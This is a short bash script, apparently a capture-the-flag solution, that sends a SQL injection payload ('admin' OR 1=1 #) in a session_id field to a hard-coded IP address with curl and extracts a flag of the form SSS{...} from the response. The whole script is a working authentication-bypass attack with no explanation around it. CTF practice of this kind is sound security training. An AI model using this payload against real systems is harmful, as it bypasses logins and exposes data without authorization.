#!/bin/bash

#simple sql insertion

url='http://141.85.224.118:12000'

flag=$(curl -s $url --data-raw "session_id=admin' OR 1=1 #" | grep -o SSS{.*})

echo $flag
